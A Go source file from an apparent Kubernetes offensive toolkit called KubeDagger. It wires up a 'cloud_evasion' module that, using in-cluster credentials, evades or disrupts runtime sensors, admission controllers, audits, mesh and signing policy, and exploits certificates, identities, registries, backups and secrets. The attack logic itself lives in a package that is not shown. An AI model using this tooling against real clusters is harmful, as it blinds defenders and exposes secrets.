package modules

import (
	"context"
	"fmt"

	"github.com/yasindce1998/KubeDagger/pkg/cloudevasion"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

type CloudEvasion struct{}

func (m *CloudEvasion) Name() string       { return "cloud_evasion" }
func (m *CloudEvasion) Platform() []string { return []string{"linux", "windows", "darwin"} }

func (m *CloudEvasion) getClients() (kubernetes.Interface, dynamic.Interface, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return nil, nil, fmt.Errorf("in-cluster config: %w", err)
	}
	client, err := kubernetes.NewForConfig(config)
	if err != nil {
		return nil, nil, fmt.Errorf("kube client: %w", err)
	}
	dynClient, err := dynamic.NewForConfig(config)
	if err != nil {
		return nil, nil, fmt.Errorf("dynamic client: %w", err)
	}
	return client, dynClient, nil
}

func (m *CloudEvasion) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	action := args["action"]
	if action == "" {
		action = "detect"
	}

	switch action {
	case "detect":
		return m.detect(ctx)
	case "cnative-sensor":
		return m.evadeCnativeSensor(ctx, args)
	case "admission":
		return m.evadeAdmission(ctx, args)
	case "runtime":
		return m.evadeRuntime(ctx, args)
	case "disrupt":
		return m.disrupt(ctx)
	case "cnative-probe":
		return m.evadeCnativeProbe(ctx, args)
	case "cnative-shield":
		return m.evadeCnativeShield(ctx, args)
	case "cnative-audit":
		return m.evadeCnativeAudit(ctx, args)
	case "cnative-responder":
		return m.evadeCnativeResponder(ctx, args)
	case "mesh_security":
		return m.evadeServiceMesh(ctx, args)
	case "cnative-certs":
		return m.exploitCnativeCerts(ctx, args)
	case "cnative-policy":
		return m.evadeCnativePolicy(ctx, args)
	case "cnative-identity":
		return m.exploitCnativeIdentity(ctx, args)
	case "cnative-net":
		return m.evadeCnativeNet(ctx, args)
	case "cnative-registry":
		return m.exploitCnativeRegistry(ctx, args)
	case "cnative-signing":
		return m.evadeCnativeSigning(ctx, args)
	case "cnative-backup":
		return m.exploitCnativeBackup(ctx, args)
	case "cnative-secrets":
		return m.exploitExternalSecrets(ctx, args)
	case "cnative-control":
		return m.exploitCnativeControl(ctx, args)
	case "cnative-serverless":
		return m.exploitCnativeServerless(ctx, args)
	case "cnative-workflow":
		return m.exploitCnativeWorkflow(ctx, args)
	default:
		return &Result{Success: false, Error: fmt.Sprintf("unknown action: %s", action)}, nil
	}
}

func (m *CloudEvasion) detect(ctx context.Context) (*Result, error) {
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	systems, err := cloudevasion.DetectSystems(ctx, client, dynClient)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{
		Success: true,
		Output:  cloudevasion.FormatSystems(systems),
	}, nil
}

func (m *CloudEvasion) evadeCnativeSensor(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "symlink"
	}

	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	result, err := cloudevasion.EvadeCnativeSensor(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeAdmission(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "enumerate"
	}

	client, _, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	result, err := cloudevasion.EvadeAdmissionControllers(ctx, client, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeRuntime(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "process_masquerade"
	}

	client, _, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	result, err := cloudevasion.EvadeRuntimeDetection(ctx, client, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) disrupt(ctx context.Context) (*Result, error) {
	client, _, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	result, err := cloudevasion.DisruptCnativeSensorDaemonSet(ctx, client)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}

	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeCnativeProbe(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "io_uring"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.EvadeCnativeProbe(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeCnativeShield(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "policy_audit"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.EvadeCnativeShield(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeCnativeAudit(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "scan_timing"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.EvadeCnativeAudit(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeCnativeResponder(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "decoy"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.EvadeCnativeResponder(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeServiceMesh(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "host_network"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.EvadeCnativeMesh(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) exploitCnativeCerts(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "enumerate"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.ExploitCnativeCerts(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeCnativePolicy(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "policy_gaps"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.EvadeCnativePolicy(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) exploitCnativeIdentity(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "enumerate"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.ExploitCnativeIdentity(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeCnativeNet(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "identity_spoof"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.EvadeCnativeNet(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) exploitCnativeRegistry(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "enumerate"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.ExploitCnativeRegistry(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) evadeCnativeSigning(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "policy_gaps"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.EvadeCnativeSigning(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) exploitCnativeBackup(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "enumerate"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.ExploitCnativeBackup(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) exploitExternalSecrets(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "enumerate"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.ExploitCnativeSecrets(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) exploitCnativeControl(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "enumerate"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.ExploitCnativeControl(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) exploitCnativeServerless(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "enumerate"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.ExploitCnativeServerless(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}

func (m *CloudEvasion) exploitCnativeWorkflow(ctx context.Context, args map[string]string) (*Result, error) {
	technique := args["technique"]
	if technique == "" {
		technique = "enumerate"
	}
	client, dynClient, err := m.getClients()
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	result, err := cloudevasion.ExploitCnativeWorkflow(ctx, client, dynClient, technique)
	if err != nil {
		return &Result{Success: false, Error: err.Error()}, nil
	}
	return &Result{Success: result.Success, Output: result.Output}, nil
}
